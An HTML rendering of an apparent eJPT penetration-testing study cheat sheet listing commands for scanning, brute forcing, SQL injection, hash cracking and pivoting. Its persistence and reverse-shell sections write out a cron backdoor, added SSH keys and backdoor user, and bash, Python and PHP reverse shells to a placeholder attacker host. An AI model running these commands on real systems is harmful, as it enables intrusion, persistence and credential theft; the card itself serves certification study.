@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>QUICK_REFERENCE.md</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: white;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            color: #2c3e50;
+            margin-top: 24px;
+            margin-bottom: 16px;
+        }
+        h1 { border-bottom: 2px solid #0066cc; padding-bottom: 10px; }
+        code {
+            background: #f4f4f4;
+            padding: 2px 4px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            color: #c7254e;
+        }
+        pre {
+            background: #f5f5f5;
+            color: #333;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            line-height: 1.4;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1);
+        }
+        pre code {
+            background: transparent;
+            color: #333;
+            padding: 0;
+        }
+        .codehilite {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 0;
+            margin: 15px 0;
+        }
+        .codehilite pre {
+            margin: 0;
+            border: none;
+            background: #f5f5f5;
+            padding: 15px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 15px 0;
+        }
+        table th, table td {
+            border: 1px solid #ddd;
+            padding: 12px;
+            text-align: left;
+        }
+        table th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+        blockquote {
+            border-left: 4px solid #0066cc;
+            margin: 15px 0;
+            padding-left: 15px;
+            color: #666;
+        }
+        a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        @media print {
+            body { margin: 0; padding: 10px; }
+            pre { page-break-inside: avoid; }
+            table { page-break-inside: avoid; }
+        }
+    </style>
+    <!-- Anime Vibes CSS Framework -->
+    <link rel="stylesheet" href="anime-vibes.css">
+    </head>
+<body>
+    <h1 id="quick-reference-card-ejpt-tools-at-a-glance">QUICK REFERENCE CARD - eJPT Tools at a Glance</h1>
+
+<h2 id="phase-1-reconnaissance-commands-copy-paste-ready">Phase 1: Reconnaissance Commands (Copy-Paste Ready)</h2>
+
+<h3 id="nmap-network-scanning">NMAP - Network Scanning</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Fast basic scan:</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.1.100
+
+<span class="c1"># Save all formats:</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>results<span class="w"> </span><span class="m">192</span>.168.1.100
+
+<span class="c1"># Host discovery:</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.1.0/24
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/01_nmap.md">01<em>RECON/01</em>nmap.md</a></p>
+
+<h3 id="gobuster-directory-brute-force">GOBUSTER - Directory Brute Force</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Basic web scan:</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+
+<span class="c1"># With extensions:</span>
+gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://target<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-x<span class="w"> </span>php,txt
+
+<span class="c1"># Subdomains:</span>
+gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span>-w<span class="w"> </span>subdomains.txt
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/02_gobuster.md">01<em>RECON/02</em>gobuster.md</a></p>
+
+<h3 id="nikto-web-vulnerability-scan">NIKTO - Web Vulnerability Scan</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Basic scan:</span>
+nikto<span class="w"> </span>-h<span class="w"> </span>http://target
+
+<span class="c1"># With output:</span>
+nikto<span class="w"> </span>-h<span class="w"> </span>http://target<span class="w"> </span>-o<span class="w"> </span>report.html<span class="w"> </span>-F<span class="w"> </span>htm
+
+<span class="c1"># HTTPS:</span>
+nikto<span class="w"> </span>-h<span class="w"> </span>https://target<span class="w"> </span>-ssl
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/03_nikto.md">01<em>RECON/03</em>nikto.md</a></p>
+
+<h3 id="enum4linux-smb-enumeration">ENUM4LINUX - SMB Enumeration</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Full enumeration:</span>
+enum4linux<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.1.100
+
+<span class="c1"># Just users:</span>
+enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="m">192</span>.168.1.100
+
+<span class="c1"># Just shares:</span>
+enum4linux<span class="w"> </span>-S<span class="w"> </span><span class="m">192</span>.168.1.100
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/04_enum4linux.md">01<em>RECON/04</em>enum4linux.md</a></p>
+
+<h3 id="netcat-banner-grabbing">NETCAT - Banner Grabbing</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Grab banner:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">22</span>
+
+<span class="c1"># Port scan:</span>
+nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">3306</span>
+
+<span class="c1"># Listener (reverse shell):</span>
+nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/05_netcat.md">01<em>RECON/05</em>netcat.md</a></p>
+
+<h3 id="dignslookup-dns-enumeration">DIG/NSLOOKUP - DNS Enumeration</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Basic lookup:</span>
+dig<span class="w"> </span>example.com
+
+<span class="c1"># Get mail servers:</span>
+dig<span class="w"> </span>example.com<span class="w"> </span>MX<span class="w"> </span>+short
+
+<span class="c1"># Zone transfer attempt:</span>
+dig<span class="w"> </span>@ns1.example.com<span class="w"> </span>example.com<span class="w"> </span>AXFR
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/06_dns_enumeration.md">01<em>RECON/06</em>dns_enumeration.md</a></p>
+
+<h3 id="smbclientsmbmap-smb-access">SMBCLIENT/SMBMAP - SMB Access</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># List shares:</span>
+smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-N
+
+<span class="c1"># Connect to share:</span>
+smbclient<span class="w"> </span>//192.168.1.100/share<span class="w"> </span>-N
+
+<span class="c1"># Check permissions:</span>
+smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">192</span>.168.1.100
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/07_smbclient_smbmap.md">01<em>RECON/07</em>smbclient_smbmap.md</a></p>
+
+<h3 id="snmpwalk-snmp-enumeration">SNMPWALK - SNMP Enumeration</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Basic enumeration:</span>
+snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1
+
+<span class="c1"># System description:</span>
+snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1.1
+
+<span class="c1"># Processes:</span>
+snmpwalk<span class="w"> </span>-v<span class="w"> </span>2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="01_RECON/08_snmpwalk.md">01<em>RECON/08</em>snmpwalk.md</a></p>
+
+<hr />
+
+<h2 id="phase-2-exploitation-commands">Phase 2: Exploitation Commands</h2>
+
+<h3 id="searchsploit-find-exploits">SEARCHSPLOIT - Find Exploits</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Find Apache exploits:</span>
+searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.6
+
+<span class="c1"># Show full path:</span>
+searchsploit<span class="w"> </span>-p<span class="w"> </span><span class="m">24659</span>
+
+<span class="c1"># View code:</span>
+searchsploit<span class="w"> </span>-x<span class="w"> </span><span class="m">24659</span>
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="02_EXPLOITATION/01_searchsploit_curl.md">02<em>EXPLOITATION/01</em>searchsploit_curl.md</a></p>
+
+<h3 id="curl-manual-http-testing">CURL - Manual HTTP Testing</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Basic request:</span>
+curl<span class="w"> </span>-v<span class="w"> </span>http://target/page
+
+<span class="c1"># With POST data:</span>
+curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;user=admin&amp;pass=pass&quot;</span><span class="w"> </span>http://target/login
+
+<span class="c1"># Follow redirects:</span>
+curl<span class="w"> </span>-L<span class="w"> </span>http://target
+
+<span class="c1"># Custom header:</span>
+curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer TOKEN&quot;</span><span class="w"> </span>http://target/api
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="02_EXPLOITATION/01_searchsploit_curl.md">02<em>EXPLOITATION/01</em>searchsploit_curl.md</a></p>
+
+<h3 id="sqlmap-sql-injection">SQLMAP - SQL Injection</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Test parameter:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span>
+
+<span class="c1"># Extract databases:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>--dbs
+
+<span class="c1"># Dump table:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+
+<span class="c1"># OS command:</span>
+sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://target/page?id=1&quot;</span><span class="w"> </span>--os-shell
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="02_EXPLOITATION/02_sqlmap.md">02<em>EXPLOITATION/02</em>sqlmap.md</a></p>
+
+<h3 id="hydra-brute-force">HYDRA - Brute Force</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># SSH brute force:</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ssh://target
+
+<span class="c1"># FTP brute force:</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>ftp://target
+
+<span class="c1"># HTTP form:</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users<span class="w"> </span>-P<span class="w"> </span>pass<span class="w"> </span>http-post-form://target/login:user<span class="o">=</span>^USER^<span class="p">&amp;</span><span class="nv">pass</span><span class="o">=</span>^PASS^:F<span class="o">=</span>Login
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="02_EXPLOITATION/03_hydra_ffuf.md">02<em>EXPLOITATION/03</em>hydra_ffuf.md</a></p>
+
+<h3 id="ffuf-web-fuzzing">FFUF - Web Fuzzing</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Directory fuzz:</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/FUZZ<span class="w"> </span>-w<span class="w"> </span>wordlist.txt
+
+<span class="c1"># Subdomain fuzz:</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://FUZZ.target.com<span class="w"> </span>-w<span class="w"> </span>subdomains.txt
+
+<span class="c1"># Parameter fuzz:</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://target/search?q<span class="o">=</span>FUZZ<span class="w"> </span>-w<span class="w"> </span>words.txt
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="02_EXPLOITATION/03_hydra_ffuf.md">02<em>EXPLOITATION/03</em>hydra_ffuf.md</a></p>
+
+<hr />
+
+<h2 id="phase-3-post-exploitation-commands">Phase 3: Post-Exploitation Commands</h2>
+
+<h3 id="john-hash-cracking">JOHN - Hash Cracking</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Crack shadow file:</span>
+john<span class="w"> </span>/etc/shadow<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+
+<span class="c1"># Show results:</span>
+john<span class="w"> </span>--show<span class="w"> </span>/etc/shadow
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="03_POST_EXPLOITATION/01_cracking_privesc.md">03<em>POST</em>EXPLOITATION/01<em>cracking</em>privesc.md</a></p>
+
+<h3 id="hashcat-gpu-cracking">HASHCAT - GPU Cracking</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Crack MD5:</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+
+<span class="c1"># Crack NTLM:</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt
+
+<span class="c1"># Show results:</span>
+hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>rockyou.txt<span class="w"> </span>--show
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="03_POST_EXPLOITATION/01_cracking_privesc.md">03<em>POST</em>EXPLOITATION/01<em>cracking</em>privesc.md</a></p>
+
+<h3 id="linpeas-privilege-escalation-enum">LINPEAS - Privilege Escalation Enum</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Run linpeas:</span>
+./linpeas.sh
+
+<span class="c1"># Save output:</span>
+./linpeas.sh<span class="w"> </span>&gt;<span class="w"> </span>linpeas.txt
+
+<span class="c1"># Look for RED items (critical)</span>
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="03_POST_EXPLOITATION/01_cracking_privesc.md">03<em>POST</em>EXPLOITATION/01<em>cracking</em>privesc.md</a></p>
+
+<h3 id="gtfobins-binary-exploitation">GTFOBINS - Binary Exploitation</h3>
+
+<p>Visit: https://gtfobins.github.io/</p>
+
+<p>Search for SUID binary → find exploitation code
+<strong>Read</strong>: <a href="03_POST_EXPLOITATION/01_cracking_privesc.md">03<em>POST</em>EXPLOITATION/01<em>cracking</em>privesc.md</a></p>
+
+<hr />
+
+<h2 id="phase-4-pivoting-commands">Phase 4: Pivoting Commands</h2>
+
+<h3 id="ssh-tunneling-port-forwarding">SSH TUNNELING - Port Forwarding</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Local port forward:</span>
+ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9999</span>:internal:80<span class="w"> </span>user@pivot
+
+<span class="c1"># SOCKS proxy:</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@pivot<span class="w"> </span>-N<span class="w"> </span>-f
+
+<span class="c1"># Remote port forward:</span>
+ssh<span class="w"> </span>-R<span class="w"> </span><span class="m">9999</span>:localhost:3306<span class="w"> </span>user@pivot
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="04_PIVOTING/01_pivoting_tunneling.md">04<em>PIVOTING/01</em>pivoting_tunneling.md</a></p>
+
+<h3 id="proxychains-route-through-proxy">PROXYCHAINS - Route Through Proxy</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Setup SOCKS first:</span>
+ssh<span class="w"> </span>-D<span class="w"> </span><span class="m">9050</span><span class="w"> </span>user@pivot<span class="w"> </span><span class="p">&amp;</span>
+
+<span class="c1"># Scan through proxy:</span>
+proxychains<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.0.0.0/24
+
+<span class="c1"># Web through proxy:</span>
+proxychains<span class="w"> </span>curl<span class="w"> </span>http://internal:80
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="04_PIVOTING/01_pivoting_tunneling.md">04<em>PIVOTING/01</em>pivoting_tunneling.md</a></p>
+
+<h3 id="chisel-http-tunneling">CHISEL - HTTP Tunneling</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Attacker (server):</span>
+chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span><span class="w"> </span>--reverse
+
+<span class="c1"># Target (client):</span>
+chisel<span class="w"> </span>client<span class="w"> </span>http://attacker:8080<span class="w"> </span>R:socks
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="04_PIVOTING/01_pivoting_tunneling.md">04<em>PIVOTING/01</em>pivoting_tunneling.md</a></p>
+
+<h3 id="metasploit-routing">METASPLOIT ROUTING</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># In msfconsole:</span>
+route<span class="w"> </span>add<span class="w"> </span><span class="m">10</span>.0.0.0<span class="w"> </span><span class="m">255</span>.255.255.0<span class="w"> </span><span class="o">[</span>session_id<span class="o">]</span>
+route<span class="w"> </span>print
+
+<span class="c1"># Then scan/exploit through route</span>
+</code></pre>
+</div>
+
+<p><strong>Read</strong>: <a href="04_PIVOTING/01_pivoting_tunneling.md">04<em>PIVOTING/01</em>pivoting_tunneling.md</a></p>
+
+<hr />
+
+<h2 id="phase-5-essential-system-commands">Phase 5: Essential System Commands</h2>
+
+<h3 id="information-gathering">Information Gathering</h3>
+
+<div class="codehilite">
+<pre><span></span><code>whoami<span class="w">              </span><span class="c1"># Current user</span>
+id<span class="w">                 </span><span class="c1"># User &amp; groups</span>
+hostname<span class="w">           </span><span class="c1"># Machine name</span>
+uname<span class="w"> </span>-a<span class="w">           </span><span class="c1"># OS info</span>
+ifconfig<span class="w"> </span>/<span class="w"> </span>ip<span class="w"> </span>addr<span class="w"> </span><span class="c1"># Network config</span>
+<span class="nb">pwd</span><span class="w">                </span><span class="c1"># Current directory</span>
+cat<span class="w"> </span>/etc/passwd<span class="w">    </span><span class="c1"># User list</span>
+cat<span class="w"> </span>/etc/shadow<span class="w">    </span><span class="c1"># Hashes (if root)</span>
+sudo<span class="w"> </span>-l<span class="w">            </span><span class="c1"># Sudo permissions</span>
+</code></pre>
+</div>
+
+<h3 id="persistence">Persistence</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Add SSH key:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ssh-rsa KEY&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
+
+<span class="c1"># Add cron backdoor:</span>
+<span class="o">(</span>crontab<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>crontab<span class="w"> </span>-
+
+<span class="c1"># Add user:</span>
+useradd<span class="w"> </span>-m<span class="w"> </span>-s<span class="w"> </span>/bin/bash<span class="w"> </span>backdoor
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;backdoor:password&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
+</code></pre>
+</div>
+
+<h3 id="reverse-shell-one-liners">Reverse Shell One-Liners</h3>
+
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># Bash:</span>
+bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker/port<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="c1"># Python:</span>
+python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess;s=socket.socket();s.connect((&quot;attacker&quot;,port));os.dup2(s.fileno(),0);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#39;</span>
+
+<span class="c1"># PHP:</span>
+php<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;$sock=fsockopen(&quot;attacker&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="quick-decision-tree">🎯 Quick Decision Tree</h2>
+
+<p><strong>"I need to find open ports"</strong> → nmap<br />
+<strong>"I need to find web directories"</strong> → gobuster<br />
+<strong>"I need to find web vulnerabilities"</strong> → nikto<br />
+<strong>"I need SMB info"</strong> → enum4linux → smbclient<br />
+<strong>"I need DNS info"</strong> → dig<br />
+<strong>"I need to exploit SQL injection"</strong> → sqlmap<br />
+<strong>"I need to crack passwords"</strong> → hydra<br />
+<strong>"I need a shell"</strong> → netcat / msfconsole<br />
+<strong>"I need to find privesc path"</strong> → linpeas<br />
+<strong>"I need to crack hashes"</strong> → john / hashcat<br />
+<strong>"I need to pivot networks"</strong> → SSH tunneling + proxychains  </p>
+
+<hr />
+
+<h2 id="by-file-types">📊 By File Types</h2>
+
+<p><strong>Hash Types</strong>:
+- <code>$6$</code> = SHA-512 (John: sha512crypt, Hashcat: -m 1800)
+- <code>$1$</code> = MD5 (John: md5crypt, Hashcat: -m 500)
+- <code>NTLM</code> = Windows (John: NT, Hashcat: -m 1000)</p>
+
+<p><strong>Common Ports</strong>:
+- 21 = FTP
+- 22 = SSH
+- 23 = Telnet
+- 25 = SMTP
+- 53 = DNS
+- 80 = HTTP
+- 110 = POP3
+- 143 = IMAP
+- 389 = LDAP
+- 443 = HTTPS
+- 445 = SMB
+- 1433 = MSSQL
+- 3306 = MySQL
+- 3389 = RDP
+- 5432 = PostgreSQL
+- 5900 = VNC
+- 8080 = Alt-HTTP</p>
+
+<hr />
+
+<h2 id="full-documentation-structure">📚 Full Documentation Structure</h2>
+
+<table>
+<thead>
+<tr>
+  <th>Phase</th>
+  <th>Files</th>
+  <th>Topics</th>
+  <th>Lines</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>1</td>
+  <td>8 files</td>
+  <td>Reconnaissance</td>
+  <td>20,000+</td>
+</tr>
+<tr>
+  <td>2</td>
+  <td>3 files</td>
+  <td>Exploitation</td>
+  <td>6,000+</td>
+</tr>
+<tr>
+  <td>3</td>
+  <td>1 file</td>
+  <td>Post-Exploitation</td>
+  <td>2,500+</td>
+</tr>
+<tr>
+  <td>4</td>
+  <td>1 file</td>
+  <td>Pivoting</td>
+  <td>1,500+</td>
+</tr>
+<tr>
+  <td>5</td>
+  <td>Tools</td>
+  <td>System commands</td>
+  <td>Inline</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h2 id="fastest-path-to-success">⚡ Fastest Path to Success</h2>
+
+<p><strong>If you have 1 week:</strong>
+1. Day 1-2: Intensive Phase 1 (esp. nmap)
+2. Day 3: Phase 2 (sqlmap focus)
+3. Day 4: Phase 3 (privilege escalation)
+4. Day 5: Practice scenarios
+5. Day 6-7: Mock exams</p>
+
+<p><strong>If you have 1 month:</strong>
+1. Week 1: All Phase 1 tools + practice (5 hours/day)
+2. Week 2: All Phase 2 tools + practice (5 hours/day)
+3. Week 3: Phase 3 &amp; 4 + practice (5 hours/day)
+4. Week 4: Review weak areas + mock exams</p>
+
+<hr />
+
+<h2 id="navigation">🔗 Navigation</h2>
+
+<ul>
+<li><strong><a href="README.md">Main README</a></strong> - Start here for overview</li>
+<li><strong><a href="SUMMARY.md">Full Summary</a></strong> - Detailed guide</li>
+<li><strong>Phase 1 Recon</strong> - <a href="01_RECON/01_nmap.md">nmap</a> | <a href="01_RECON/02_gobuster.md">gobuster</a> | <a href="01_RECON/03_nikto.md">nikto</a> | <a href="01_RECON/04_enum4linux.md">enum4linux</a> | <a href="01_RECON/05_netcat.md">netcat</a> | <a href="01_RECON/06_dns_enumeration.md">dns</a> | <a href="01_RECON/07_smbclient_smbmap.md">smb</a> | <a href="01_RECON/08_snmpwalk.md">snmp</a></li>
+<li><strong>Phase 2 Exploit</strong> - <a href="02_EXPLOITATION/01_searchsploit_curl.md">searchsploit/curl</a> | <a href="02_EXPLOITATION/02_sqlmap.md">sqlmap</a> | <a href="02_EXPLOITATION/03_hydra_ffuf.md">hydra/ffuf</a></li>
+<li><strong>Phase 3 Post</strong> - <a href="03_POST_EXPLOITATION/01_cracking_privesc.md">cracking/privesc</a></li>
+<li><strong>Phase 4 Pivot</strong> - <a href="04_PIVOTING/01_pivoting_tunneling.md">tunneling/pivoting</a></li>
+</ul>
+
+<hr />
+
+<p><strong>Use this card as your quick reference during exams and engagements!</strong></p>
+
+<p><em>For detailed info on any tool, click the link or search the full documentation.</em></p>
+
+</body>
+</html>
